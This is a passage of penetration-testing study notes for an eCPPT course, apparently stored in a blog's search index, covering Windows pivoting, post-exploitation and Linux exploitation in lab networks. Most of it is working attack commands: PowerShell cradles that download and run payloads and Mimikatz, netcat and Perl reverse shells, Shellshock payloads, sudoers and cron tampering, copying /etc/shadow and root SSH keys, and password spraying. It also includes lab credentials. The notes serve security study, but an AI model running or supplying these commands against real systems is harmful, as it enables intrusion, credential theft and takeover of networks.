are dealing with different networks, so we will need to set an autoroute  use post/multi/manage/autoroute set session 1 run  use auxiliary/server/socks_proxy set srvhost &lt;kali ip&gt; run   remember the port must be the same as proxychains.conf file now we can set our browser, in the proxy config, in the socks session, set the kali ip with the right port we can open the page 10.100.11.100:8443 from that weird port that was open a apache tomcat 7.0.81 page opens, if we search For vulnerability For that version of apache           we get CVE-2017-12617  metasploit has this exploit, but first we need to set a proxy            why do we need to set a proxy?   because its a internal network, we got set the proxy, For the target of the internal network can receive our payload       use post/windows/manage/portproxy set CONNECT_ADDRESS &lt;kali ip&gt; set CONNECT_PORT 4444 set LOCAL_ADDRESS 10.100.11.101 = its the first host we compromise. set LOCAL_PORT 4444 set session 1 run  use exploit/multi/http/tomcat_jsp_upload_bypass set options set payload java/jsp_shell_reverse_tcp set rport 8443 = that is the port that we access the apache page run // we should get a shell back   upgrade the shell to a meterpreter shell  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.100.11.101 LPORT=4444 -f exe &gt; /tmp/payload.exe  python3 -m http.server 8000   lets add another port in the portproxy  use post/windows/manage/portproxy  set CONNECT_ADDRESS &lt;kali ip&gt; set CONNECT_PORT 8000 set LOCAL_ADDRESS 10.100.11.101 = its the first host we compromise. set LOCAL_PORT 8000 set session 1 run      [!NOTE] cool    set a handler  jobs -K = to kill all jobs opens use exploit/multi/handler set options set lport 4444 = the port that we opened with portproxy exploit -j   in the Java shell:  powershell -c iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload.exe', 'C:\\Windows\\Temp\\payload.exe')   // then execute it \tC:\\windows\\temp\\payload.exe      we should gain a shell back from meterpreter from our handler    Obtain Hashes using Mimikatz   in Java session:  \tpowershell -c iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds      of course, make sure the Invoke-Mimikatz is in the python web host directory. this cradle will download and execute the Invoke-Mimikatz we should get hashes back    Extra [+]  PSINJECT   // PSINJECT is the same as migrate from metasploit but its from Empire  interact &lt;agent number&gt; shell ps  searchmodule psinject usemodule management/psinject set Agent &lt;agent number&gt; set Listener http set ProcId &lt;the PID from the process you wanna migrate, in this case lsass&gt; execute      this should open a new agent (session) just type agents to visualize    Lab 2 Powershell for post-exploitation and Lateral Movement   targets network: 172.17.80.0/24   myip: 175.13.80.5   gather information  sudo nmap -sn -oG - 172.17.80.* | awk '/Up$/ {print $2}' fping -a -g 172.17.80.0/24 2&gt;/dev/null &gt; hostsup  - 172.17.80.1 - 172.17.80.100   Exploit Apache ActiveMQ  // we found that port 8161 is running Apache ActiveMQ, so I searched For that version in metasploit  \texploit(multi/http/apache_activemq_upload_jsp) and got a shell.   // ip discovered: 10.100.11.101   in Meterpreter session:  run autoroute -s 10.100.11.0/24   Token Impersonation  use incognito list_tokens -u impersonate_token ELS-CHILD\\local_admin   Sending PowerView to the target  open a web host with python then send and execute the file:  powershell \"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Get-NetDomainController\"   Results  Forest                     : eLS.local CurrentTime                : 1/8/2022 11:36:28 PM HighestCommittedUsn        : 209035 OSVersion                  : Windows Server 2012 R2 Standard Roles                      : {PdcRole, RidRole, InfrastructureRole} Domain                     : els-child.eLS.local IPAddress                  : 10.100.10.253 SiteName                   : Default-First-Site-Name SyncFromAllServersCallback :  InboundConnections         : {18be55e6-23fd-4162-ab64-6b2cf34040e5} OutboundConnections        : {e308ece2-539f-4f7a-9fc2-fee4e5adfd31} Name                       : child-dc01.els-child.eLS.local Partitions                 : {CN=Configuration,DC=eLS,DC=local, CN=Schema,CN=Co                              nfiguration,DC=eLS,DC=local, DC=ForestDnsZones,DC=                              eLS,DC=local, DC=els-child,DC=eLS,DC=local...}       [+] // DC els.child.eLS.local 10.100.10.253    local_admin is a local administrator of the domain controller  powershell \"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Find-LocalAdminAccess\"   going back to SYSTEM  ctrl+z the shell in Meterpreter: \trev2self   search for files  search -f *.txt  found a file uat_teste_account.txt with credentials: \tUsername: ELS-CHILD\\local_admin \tPassword: P@ssw0rd123    arp scanner  use post/windows/gather/arp_scanner set options // we found a new ip 10.11.100.101   set a proxy to the internal network  use post/windows/manage/portproxy  set CONNECT_ADDRESS &lt;kali ip&gt; set CONNECT_PORT 4444 set LOCAL_ADDRESS 10.100.11.101 set LOCAL_PORT 4444  set SESSION 1 run   powershell_remoting to execute commands in that internal network  use exploit/windows/local/powershell_remoting  set SMBUSER local_admin set SMBPASS P@ssw0rd123 set SMBDOMAIN ELS-CHILD set RHOSTS 10.100.11.100 set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.100.11.101 set LPORT 4444 exploit -j      we should get a shell back from the win10 machine    to execute commands on the DC, we just need to modify the powershell_remoting  set SESSION 2 = the win10 machine set RHOSTS 10.100.10.253 = the IP of DC exploit -j      now we should have a shell from the DC    download cradles used  powershell \"iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload.exe', 'C:\\Windows\\Temp\\payload.exe')\"  powershell \"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/shell.exe')   ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","windows","powershell"],
        "url": "/notes/ecppt/powershell/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser4.jpg"
      },{
        "title": "4 - Linux Security",
        "excerpt":"  Information Gathering   Remote Enumeration   OS Fingerprinting Re-Cap  port scanning service identification operating system fingerprinting banner grabbing etc   nmap -O --osscan-guess &lt;target ip&gt; // agressive guessing the OS nmap -v -sT -O &lt;target ip&gt; // througout the ports we can, the majority of times, know what system is nmap -v -sS -sU -sV -n &lt;target ip&gt;   After we’ve identified open services     we can begin enumerating those services For   version information, configuration details, potential exploitability   Low Hanging Fruit   NFS - Network File System      RPC-based file sharing protocol = its used to provide access to shared resources   usually found listening on TCP and/or UDP port 2049.   nmap -sT -sU -sV -p 2049 &lt;target ip&gt;      Relies on other RPC services, such as mountd. it should be directly queried via the Portmapper service which is found on port TCP and/or UDP 111 when using Nmap NSE scripts For instance.   Exports     Exports are the mechanism used by NFS is order to export directories, in other words, make entire directories available to other users over the network.   Can usually be found in the /etc/exports file on a target host locally   Enumerating NFS     We can find some NFS scripts we can use For NFS:   ls /usr/share/nmap/scripts/ | grep nfs \tnfs-ls.nse \tnfs-showmount.nse \tnfs-statfs.nse   nmap --script nfs-ls,nfs-showmount,nfs-statfs &lt;target ip&gt;   alternatively,  showmount -e &lt;target ip&gt;  // -e or --exports   Examples  Export list For 192.168.13.26  /var/www * /home/bob *      When the export directory its listed with “*”, that means that it allows mounting the exports from any IP address or host.   Ideally, an administrator would want to explicitly define (whitelist) IP addresses or hosts that should be allowed to connect to the NFS server, in which case, the output would be something similar to:   Export list For 192.168.13.26  /var/www admin.foocampus.com 192.168.13.100 /home/bob 192.168.13.129      Even in the case where our access is restricted due to an NFS whitelist configuration like the above, the output still gives us valuable information regarding which IP addresses or hosts can mount any available exports.   in this scenario, we can spoof our IP address to match a whitelisted IP or take control of a host which is allowed to connect.   Once we’ve confirmed a misconfiguration     then we can attempt to mount the available exported directories   first create a directory   mkdir -p /mnt/home/bob      export the target dir:   mount -t nfs &lt;NFS Server IP&gt;:/home/bob /mnt/home/bob -o nolock   mount // to confirm if the NFS directory was exported  cd /mnt/home/bob &amp;&amp; ls -al // go to the mounted directory and list contents   Enumerating Portmapper (rcpbind)     its used to map RCP or ONC RPC (Open Network Computing Remote Procedure Call)   usually found listening on ports TCP/UDP 111 and in some cases, ports TCP/UDP 32771   Querying a single port (TCP/111), essentially enumerates all related RPC-related service ports without us having to conduct a port scan against all those ports individually.   Nmap NSE can be used to enumerate: rpcinfo, rpc-grind   nmap --script rpc-grind,rpcinfo &lt;target ip&gt; -p 111   alternatively,  rpcinfo -p &lt;target ip&gt;   SMB (Samba)      Provides print and file sharing services For windows clients within an environment.   Recent versions also seamlessly can be integrated with  Active Directory domains.   Can be found listening on the usual NetBIOS ports: 135,137,138,139,445   nmap -sT -sU -sV &lt;target ip&gt; -p 135,137,138,139,445 --open   SMB Shares     Now that we have identified that Samba is on the target system, we can enumerate information   including shares, users, password policies etc   nmap --script smb-enum-shares &lt;target ip&gt;   alternatively,  smbclient -L &lt;target ip&gt;   What access do we have?     To know which shares we have access   we can use smbmap = https://github.com/ShawnDEvans/smbmap   smbmap -H &lt;target ip&gt;   // there are many more options with smbmap, including interacting with the remote file system, searching file contents For specific strings, and even executings commands.   smbclient \\\\\\\\&lt;target ip&gt;\\\\&lt;share&gt;   we can mount samba shares too     similar to NFS, but in this case we need to download a package: cifs-utils   mkdir /mnt/www mount -t cifs \\\\\\\\&lt;target ip&gt;\\\\&lt;share&gt; /mnt/www cd /mnt/www &amp;&amp; ls -als   SMB Users   Method # 1 - Bash ‘for loop’ and rpcclient  // using rpcclient and a list of potential usernames we have gathered from other phases  // if you dont gathered any usernames, we can use a wordlist // Statistically-likely-usernames = https://github.com/insidetrust/statistically-likely-usernames   For u in $(cat users.txt) \tdo rpcclient -U \"\" &lt;target ip&gt; -N \\ \t--command=\"lookupnames $u\"; done | grep \"User: 1\"   -U \"\" = anonymous/guest logon  lookupnames = is a rpcclient command -N = specifies to use no password, since we can log in as guest we can also do it manually rpcclient -U \"\" &lt;ip&gt; -N lookupnames &lt;user&gt; valid users = \"User: 1\" // Non-existent user = \"NT_STATUS_NONE_MAPPED\"   rpcclient has various options example: lookupsids, netshareenum, srvinfo, enumprivs   Method # 2 - Automated (enum4linux)  // great tool to enumerate an SMB server \tenum4linux = https://github.com/portcullislabs/enum4linux   enum4linux &lt;target ip&gt;   Enumerating SMTP Users  // the following techniques can apply to: \tSendmail, Postfix, Exim, Microsoft Exchange      usually found on TCP/25   we can use nmap NSE as well   to enumerate which options (verbs or features) are enabled  nmap --script smtp-commands &lt;target ip&gt; -p 25   alternatively,  nc &lt;ip&gt; 25 or telnet &lt;ip&gt; 25 help      For our purposes, we are interested in the [ RCPT, VRFY, EXPN ] features/verbs   which can be used to enumerate users   SMTP RCPT TO          first   → telnet  25 = connect  → HELO tester.localdomain = identify ourselves  → MAIL FROM: tester@tester.localdomain = to tell the server who the mail will be from            then we can enumerate potential users:       RCPT TO: &lt;user@domain.com&gt;      valid use = code 250 // non-existent user = code 550    EXPN  // it was designed to be used to query a mail server For a list of members within a mailing list on a server.     after the connection with nc or telnet   EXPN &lt;user&gt;      valid use = code “250” // non-existent user = code “550”    VRFY  // similar to EXPN output     after the connection with nc or telnet   VRFY &lt;user&gt;      valid use = code “250” // non-existent user = code “550”    Automate the enumeration with SMTP-USER-ENUM  // it tests all three methods (RCPT, EXPN, VRFY) \thttp://pentestmonkey.net/tools/user-enumeration/smtp-user-enum   // some examples of usage:  smtp-user-enum -M VRFY -U users.txt -t &lt;ip&gt; smtp-user-enum -M EXPN -u admin -t &lt;ip&gt; smtp-user-enum -M RCPT -U users.txt -T ips.txt smtp-user-enum -M EXPN -D example.com -U users.txt -t &lt;ip&gt;  -M = mode -U = user file -u = fixed user -T = target ips file -t = fixed target ips -D = domain   Local Enumeration      Network Information   System Information   Network Information   we can ask ourselves some important questions:     How is the exploited machine connected to the network?   Is the machine multi-homed? Can we pivot to other hosts in other segments?   Do we have unfettered outbound connectivity to the internet or is egress traffic to certain ports or protocols?   Is there a firewall between me and other devides/machines?   Is the machine Im on, communicating with other hosts? if so, what is the purpose or function of the hosts that my current machine is communicating with?   What protocols are being used that are originating from my actively exploited machine? Are we initiating FTP connections or other connections (SSH etc) to other machines?   Are other machines initiating a connection with me? if so, can that traffic be intercepted or sniffed as cleartext in transit? Is it encrypted?   Some commands  ifconfig -a / ip -a  // Get information regarding our current network interfaces. // To know our IP address and whether or not there are additional interfaces that we may be able to use as pivots to other network segments.   route -n / ip -r  // its used to print our current network routes, which includes our gateway of course.   traceroute -n &lt;ip address&gt;  // how many hops are between our compromised machine and other network segments.   DNS Information  cat /etc/resolv.conf      what machine is resolving our DNS queries?   Can we use it to exfiltrate data over a DNS tunnel?   Is the DNS server vulnerable to any exploits?   Is it an Active Directory controller?   ARP Cache  arp -en     can give us a bit of situational awareness regarding machines near us, or machines that our currently exploited system communicates with For one reason or another.   who we are communicating with   whats being communicated   whether that traffic or communication has any value to us from an exploitation perspective   Netstat  netstat -auntp      what other machines or devices we are currently connected to   which ports or services on other machines we are connected to   what ports our current machine are listening on   Are there other systems establishing connections with our current machine      [+] System without netstat [+]       if For any reason, the machine does not have netstat or its blocked.   https://staaldraad.github.io/2017/12/20/netstat-without-netstat/   this article teaches how to parse similar information from:   /proc/net/tcp   /proc/net/udp      ss - alternative to netstat we can use to list active network connections with the ss command    ss -twurp   Outbound Port Connectivity  // check if our outbound port connectivity is restricted in any way   A quick way to check that:  \thttp://portquiz.net/      Portquiz is a web server which has most (if not all) TCP ports listening. We can use it to confirm we can connect to arbitrary ports outside of our network with a quick nmap scan:   nmap -sT -p 4444-4450 portquiz.net  // Keep in mind that any scans originating from your compromised machine can alert network administrators of anomalous activity.  // Considering using nmaps –T (timing) option at a low value to stay under any internal IDs radar.   System Information   // Our goal with this phase is to get information regarding: \tOperating System and Kernel \tEnvironment Variables \tInteresting Files and Sensitive Information \tUsers, Groups, Permissions and Privileges \tServices and Associated Configuration files \tCron Jobs, System Tasks \tInstalled Applications and Versions \tRunning Processes   // Ultimate objective: \tget better access \tobtain additional footholds within an environment   Information Gathering Tools and Resources          LinEnum    https://github.com/rebootuser/LinEnum   // Automated Information Gathering Tool.            LinuxPrivChecker   https://github.com/sleventyeleven/linuxprivchecker   // checks For privilege escalation methods            Unix-privesc-check   http://pentestmonkey.net/tools/audit/unix-privesc-check   // finds common misconfigurations which can help us elevate our privileges            mimipenguin   https://github.com/huntergregal/mimipenguin   // For dumping the logon password For the currently logged on use;   // This should be done during the post-exploitation phase       Additional Resources           Local Linux Enumerating &amp; Privilege Escalation CheatSheet:   https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623            Basic Linux Privilege Escalation:   https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/            Local Unix PrivEsc Aggregation - FuzzySecurity (Kernel Exploits):   https://github.com/FuzzySecurity/Unix-PrivEsc       extra [+] - privesc  run LinuxPrivChecker example:  Sudoer \tuser ALL=(root) NOPASSWD: /usr/bin/apt edit-sources ../*  sudo /usr/bin/apt edit-sources ../../../../tmp/foo  option 3 = vim.basic :!sh       we have root access    Summary regarding our network state:      Summary regarding our System information:                  Lab 1 - Linux Exploitation (Remote Enumeration)   Scope: The scope is limited to the following domain and netblock:   Netblock: 172.16.80.1/24  Domain: robotstogo.localdomain      Lab under maintenance - and I dont have pacience to wait So ill just study, and do the lab later, why am I writing this? anyway    Task 1 - Identify Operating Systems, Ports/Services and Versions   nmap -sT -O -sV --version-all 172.16.80.1/24   // Host // Operating System // Ports - banner   172.16.80.22  Linux 2.6.X  22 OpenSSH 4.7p1 80 Apache httpd 2.2.8 139 Samba 3.x 443 Apache httpd 2.2.8 445 Samba 3.x 512 tcpwrapped 1999 rmiregistry 8180 Apache Tomcat 37179 rmiregistry 46079 rmiregistry 46732 mountd 47070 status 54202 nlockmgr --------------------------------------------------------------------- 172.16.80.24  Linux 2.6.32  4433 nginx 1.1.19 8080 Apache Tomcat JSP Engine --------------------------------------------------------------------- 172.16.80.26  Unix  21 vsftpd 2.3.4 --------------------------------------------------------------------- 172.16.80.27  Linux 3.2  22 OpenSSH 7.6p1 25 Sendmail 8.15.2 79 Linux fingerd 80 nginx 1.13.8 111 rpcbind 139 Samba 3.x 445 Samba 3.x 587 Sendmail 8.15.2 2049 nfs_acl 32931 nlockmgr 34457 mountd 37437 mountd 48797 mountd 60666 unknown   Task 2 - Enumerate any SMTP Servers for Enabled Methods/Verbs and Users  nmap --script smtp-commands 172.16.80.27 -p 25 nc 172.16.80.27 25   // SMTP Server IP // Enabled Methods 172.16.80.27 - HELO, EHLO, MAIL, RCPT, DATA, RSET NOOP, QUIT, HELP, VRFY, EXPN, VERB, ETRN, DSN, AUTH   Task 3 - Enumerate The Samba server For Version, Users, Available Shares and Content   // obtain a list of local users  enum4linux -r 172.16.80.22 | grep \"Local User\" enum4linux -r 172.16.80.27 | grep \"Local User\"   // identify shares and permissions  smbmap -H 172.16.80.22 smbmap -H 172.16.80.27   // the system allows anonymous or guest access?  nmap --script smb-enum-shares 172.16.80.22 -p 445   // no useful results here, so we may try to connect without password with smbclient (-N option)  smbclient -N \\\\\\\\172.16.80.22\\\\tmp -U \"\"   In SMB shell:  ls = to list directories   // lets try the second machine  nmap --script smb-enum-shares 172.16.80.27 -p 445  smbclient -N \\\\\\\\172.16.80.27\\\\web -U \"\" ls   // To obtain the samba version and operating system  nmap --script smb-os-discovery 172.16.80.22 -p 445 nmap --script smb-os-discovery 172.16.80.27 -p 445   Task 4 - Identify NFS Shares and Content  nmap --script nfs-ls 172.16.80.27  // we discovered that there is /home/simon being exported and contains a backup.zip   Task 5 - Execute a Nmap Vulnerability Script Scan against Dicovered Hosts/Ports     Important: With the Nmap scans that follows, notice we are using a “+” character before the “vuln” category For the NSE script scan; this will force Nmap to conduct vulnerability scans against *non-standard ports.   Confucting this type of scan against a large set of ports, will take a very long time; Also, it will generate a lot of noise.   nmap --script +vuln -p 80,1999,8180,35316 172.16.80.22 nmap --script +vuln -p 4433 172.16.80.24 nmap --script +vuln -p 2049,445,80,60666 172.16.80.27   Task 6 - Identify Services That Can be Used to enumerate Users  172.16.80.22: \tSMB / 445 / Using enum4linux script or rpcclient  172.16.80.27: \tSMTP / 25 / Using smtp-user-enum script or manually \tFINGERD / 79 / finger root@172.16.80.27 (can be automated with a “For loop”.) \tSMB / 445 / Using enum4linux script or rpcclient   Lab 2 - Linux Exploitation (Local Enumeration)  Machine IP: 172.16.80.27 ip: 172.16.80.5 Username: lowpriv Password: l0wpr1vx80#   Task 1 - Enumerate for SUID Executables  find / -perm -4000 2&gt;/dev/null  /sbin/mount.nfs /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/xorg/Xorg.wrap /usr/lib/eject/dmcrypt-get-device /usr/sbin/vudo /usr/sbin/sensible-mda /usr/sbin/pppd /usr/bin/chsh /usr/bin/pkexec /usr/bin/chfn /usr/bin/bwrap /usr/bin/vmware-user-suid-wrapper /usr/bin/procmail /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/kismet_capture /usr/bin/sudo /usr/bin/passwd /usr/local/bin/catme /bin/umount /bin/ntfs-3g /bin/fusermount /bin/su /bin/ping /bin/mount      here is 2 files that we can try   /usr/sbin/vudo   /usr/local/bin/catme     /usr/sbin/vudo -h vudo - safely edit the sudoers file           usage: vudo [-chqsV] [-f sudoers] [-x output_file]   Options:    -c, --check              check-only mode   -f, --file=sudoers       specify sudoers file location   -h, --help               display help message and exit   -q, --quiet              less verbose (quiet) syntax error messages   -s, --strict             strict syntax checking   -V, --version            display version information and exit   -x, --export=output_file write sudoers in JSON format to output_file   we can use this vudo file to edit the sudoer file  // so we can add our user there  /usr/sbin/vudo -f /etc/sudoers \tlowpriv ALL=(root) NOPASSWD: ALL \t:wq! \tsudo bash      Pwned!    back to lowpriv user - Task 2  find /etc/cron* -type f -perm -o+w -exec ls -l {} \\; // the command will search For files that are writeable by everyone \t-rwxrwxrwx 1 root root 47 Feb 21  2018 /etc/cron.hourly/oddjob      we have write access   lets copy the shadow file to tmp/shadow   echo -e '\\#!/bin/bash\\n/bin/cat /etc/shadow &gt; /tmp/shadow' &gt; /etc/cron.hourly/oddjob      in the min 17 of every hour, as the crontab shows…   our command will be executed, so the shadow will be copied to the temp folder   another method     we have access to the /root folders, but we cant list files   we can see that .ssh exists, but we cant access   we cant access, but we can try to access the file id_rsa inside the .ssh   that is a common file   cat /root/.ssh/id_rsa   // we have the RSA PRIVATE KEY // to access the ssh   // check if the public key authentication is available  cat /etc/ssh/sshd_config | grep Pub \tPubkeyAuthentication yes      create a .ssh in the user /home folder   copy the id_rsa file to this folder   and give the property permission   cd /home/lowpriv/ mkdir .ssh cp /root/.ssh/id_rsa /home/lowpriv/.ssh/. chmod 600 id_rsa   // now we can access the root@localhost via ssh   ssh -i /home/lowpriv/.ssh/id_rsa root@localhost   2nd time  grep -nri \"/tmp/message\" /usr printf '#! /bin/bash\\necho \"student ALL=NOPASSWD:ALL\" &gt;&gt; /etc/sudoers'   Exploitation over the Network   Password Spray Attack     trying just a single password attempt against tens or hundreds of user accounts.   reduces the risk of account lockout   help us stay under the radar        aka Reverse-Brute-force attack       first we need to gather as many usernames as possible   utilizing more than one tool could help us compile an initial user list   The Harvester, Statistically likely usernames, etc   smtp-user-enum, metasploit has smtp_enum module, manual methods as vrfy, expn etc   create a user list     using the Statiscally Likely Usernames   head -n 50 john.txt &gt;&gt; users.txt      combine with user that you gathered from other phases of testing   in Metasploit:  \tuse auxiliary/scanner/smtp/smtp_enum \tset options \t// we should get valid users as result, so we must add these in a file valid_users.txt      now we should determine one or two (maximum) commonly-used passwords   the most common its the current season along with the year. e.g., Spring2018   another common password: CompanyName + a numerical value, e.g., FooCorp01, FooCorp02   Passwords may be reused across systems within an environment as well   determine services that we can spray attack  nmap -sT &lt;target ip&gt; --open --max-retries 1 -n // ssh, smtp, smb are some services we can try   Summary     Create a list of users gathered through our information gatherins phase, in addition to using usernames from the statistically likely usernames list.   Confirmed valid users using SMTP user enumeration with smtp_enum from metasploit scanner module.   Created our list of validated user accounts, and a list containing two commonly-used passwords   Determine several services on our target machine we can execute our password spray attack against and have decided on SSH.   We can execute the attack  hydra - https://github.com/vanhauser-thc/thc-hydra    hydra -L users.txt -P passwords.txt ssh://&lt;target ip&gt;      once we have obtained valid credentials For a single user, we can also exploit the common case of password reuse within an environment.    hydra -l david -p Spring2018 -M ssh_server.txt ssh    // the -M = specify a list of ssh servers we can attack      metasploit smb_login scanner module can be used to obtain similar results For passwords spray attacks against SMB services.   this attack are also known to ve very successful against platforms such as Outlook Web Access or Exchange Portals.   Metasploit has a module on brute force OWA portals - owa_login   Depending on system configurations, password spray can be detected and thwarted, which its crucial to only attempt one (recommended) to two (maximum) passwords during a single run.   after attempting a password spray run, if unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.   multiple attempts within a certain time-range also result in detection and/or lockouts.   Exploiting Samba     Typically provides file sharing services to both windows, and linux users.   Versions up to 4.6.4 contain vulnerabilities that allow an attacker to take control of an affected server completely;   recently seen with CVE-2017-7494, aka SambaCry   First - Identify Samba and version  nmap --script smb-os-discovery -p 445 &lt;target ip&gt;   // once the version of Samba is known, we can start to investigate exactly which vulnerabilities might be present For that particular version. // searchsploit is a tool For this, its a local database of all exploits that can also be found at exploit-db.com   find an exploit  searchsploit samba 3.0.20     // with the version we found earlier      There is a (Username map script command execution) available, and also the metasploit version of the same exploit   Moreover about this vulnerability- https://www.samba.org/samba/security/CVE-2007-2447.html   exploit  in metasploit:  \tuse exploit/multi/samba/usermap_script \tset options \trun \t// we should gain a shell with root access   Get a better shell     even tho we are root, we dont have a decent shell   so we can execute a python one liner to gives us a proper PTY (Pseudo TTY)   python -c \"import pty; pty.spawn('/bin/sh')\"   Samba Symlink Directory Traversal     This vuln essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing For read access to the entire file system outside of the share directory.   Can be exploited using a modified “smbclient”, but metasploit contains a module For exploitation as well.   pre-requisites, samba server contains a writeable share and widelinks parameter in the smb.conf file is set with a value of “yes”   smbmap -H &lt;target ip&gt;    // determine if you have write access to the shares      after we have determined a writeable share is available    in metasploit:  \tuse auxiliary/admin/smb/samba_symlink_traversal \tset options \tset smbtarget &lt;rootfs&gt; // default \trun   // now we can access the share  smbclient \\\\\\\\&lt;target ip&gt;\\\\tmp -N cd rootfs      notice that, the directory rootfs is created in the writeable share we can now, use get and put commands, to download/upload files into the share.    useful command - TAR     when conducting post-exploitation tasks using smbclient is the “tar” command.   with tar command, we can create an archive of all files within a current directory, For local perusual later.   cd etc tar c ../tmp/all_files.tar * // the above will create a tar archive of the /etc/ directory on the target system to our local systems /tmp directory  ls -als all_files.tar to list the copied files      We can then extract, and start enumerating files For sensitive content, passwords, etc.   tar xf /tmp/all_files.tar cd /tmp/rootfs grep -r \"password\" * 2&gt;&amp;1 /dev/null   Writeable Samba Share to Remote Command Execution via Perl Reverse Shell          what to do in a samba server is fully patched, but we have a writeable share available to us?            in this scenario, server fully patched, and contains a share named ‘www’, which appears to be possibly configured to allow administrators to easily update an internal web application.       // get the samba version  nmap --script smb-os-discovery -p 445 &lt;target ip&gt;   // get the permission of the shares  smbmap -H &lt;target ip&gt;   about our findings     Web roots often contain files specific to a web server configuration and can futhermore be used to obtain credentials to other service , .e.g. MySQL   Being able to write to a web root, is even better depending ob the web server configuration; For instance, is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?   Connect  smbclient \\\\\\\\&lt;target ip&gt;\\\\www -N   ls // the presence of a “.pl” extension indicates that the server is likely configured to process Perl (CGI) programs. // grab the file and analyse the code get index.pl      lets check if the port 80 is open   nmap -sT &lt;target ip&gt; --max-retries 1 -n --open      lets point a browser at our target   open &lt;target ip&gt;/index.pl in a browser      we have confirmed that the www share is configured on the Samba server, is most likely being used to server the index.pl script and is likely the actual web root For the web server.       make sure we have WRITE permission to the “www” share   lets create a file locally and send to the smb share   #!/usr/bin/perl print \"Content-type: text/html\\n\\n\"; system(\"id\");   //it will execute the id Linux system command and will display your current UID and GID information when accessed with your browser.   \tsmbclient \\\\\\\\&lt;target ip&gt;\\\\www -N \tput test.pl      lets browser to our test.pl file   in browser:  &lt;target ip&gt;/test.pl      this will confirm For us that we can upload our own Perl scripts to the server and can execute remote operating system commands through our test script.    reverse shell - Perl     Now we can use perl-reverse-shell.pl from pentestmonkey        in kali: /usr/share/webshells/perl directory // just change the ip of the source code // and note the port number       Upload the script to the share   smbclient &gt; put       open a netcat listener   nc -lvnp 1234 // -n = no dns // -l = listen // -v = verbose // -p = port we want to listen on      now we can open the file through the browser in browser:   &lt;target ip&gt;/&lt;perl-reverse-shell.pl&gt;  // we have a shell      alternatively, we could have modified the test.pl that we upload before. add in the code:   system(\"nc &lt;target ip&gt; 1234 -e /bin/bash\");   Exploiting Shellshock  aka Bashdoor      its from september 2014   discovered in unix bash shell, and affected CGI programs on web servers;   openssh, dhcp clients, and several other attack vectors, e.g. Qmail servers etc   resulted in several CVEs being assigned   determine if the system is vulnerable     from a local system perspective:   env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\"   // When executed in a vulnerable bash shell, the string essentially executes an environment variable called x. // x in turn runs the echo vulnerable command, which is outside of the environment variable function // i.e., outside of the “() { :;};” part of the string      This was not intended as part of the design of how bash should handle environment variables.   On a patched system, the correct output of the above string would simply be this is a test   primary attack vectors     one of the primary attack vector that was seen in the wild following the disclosure of shellshock was the modification of User-Agent strings to include Shellshock payloads intended to run commands on the remote server.   User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine      if the attacker system receives the unique payload string, then this serves as confirmation that the system ran the ping command.    dirsearch - https://github.com/maurosoria/dirsearch          Is similar to some other tools you may be familiar with such as dirb or dirbuster and is used to execute dictionary-type attacks against web servers in search For interesting files, directories, etc.            In order to find some CGI programs on a web server, we are going to utilize: // -e =  extensions  // -r = recursive       ./dirsearch.py -u http://&lt;target ip&gt;/ -e cgi -r   discovered: // cgi-bin directory // login.cgi file // we can access the login.cgi   open the file in the browser  &lt;target ip&gt;/cgi-bin/login.cgi   identify wheter or not the .cgi program is vulnerable to shellshock     we can use http-shellshock Nmap NSE script For this.   nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi &lt;target ip&gt; -p 80  // its likely vulnerable   Ways to Exploit     There are multiple ways to exploit shellshock to gain control over a system.   wget -U \"() { foo;}echo \\\"Content-type: text/plain\\\"; echo; /bin/cat /etc/passwd\" http://&lt;target ip&gt;/cgi-bin/login.cgi &amp;&amp; cat login.cgi  // we should get the /etc/passwd of the target   // wget will issue a GET request to the target system, use a Shellshock-ified User-Agent(-U) to echo the contents of /etc/passwd to a local file on our attacker system (login.cgi), and will then display its contents to us (&amp;&amp; cat login.cgi)      Now that we confirmed that we can execute commands on the remote system, we can use that to our advantage.   -set up a handler   nc -lvnp 1234      set up the wget command with a reverse shell   wget -U \"() { foo;echo; /bin/nc &lt;kali ip&gt; 1234 -e /bin/sh\" http://&lt;target ip&gt;//cgi-bin/login.cgi      if everything is correct, we should gain a reverse shell from our handler    Exploiting Heartbleed      Heartbleed, 2014, was a critical bug affecting OpenSSL versions 1.0.1 through 1.0.1f and allowed For the reading of encrypted data stored in memory due to a faulty implementation of the TLS (Transport Layer Security) and DTLS (Datagram Transport Layer Security) protocols heartbeat extension.   Verify a vulnerable OpenSSL implementation  nmap --script ssl-heartbleed &lt;target ip&gt;  After confirmed, we can use metasploit  use auxiliary/scanner/ssl/openssl_heartbleed set action DUMP set other options run // metasploit will store the result in ~/.msf4/loot directory as .bin file   check the results  strings &lt;file.bin&gt;   // in this case, the username and password was leaked      [+] if you dont get any leaked data from your first run, try again.    Exploiting Java RMI Registry          Java Remote Method Invocation       There exists a vulnerability in default configurations of RMI registry and RMI activation services and affects what is known as the RMI Distributed Garbage Collector, and essentially allows the loading of arbitrary Java classes from an attacker-defined URL.   Usually found on port 1099 TCP   in nmap is identified by the GNU Classpath grmiregistry   nmap -sT &lt;target ip&gt; -p 1099 -sV   Alternatively, in metasploit:  use exploit/multi/misc/java_rmi_server set options, most as default run -j      the SRVHOST and 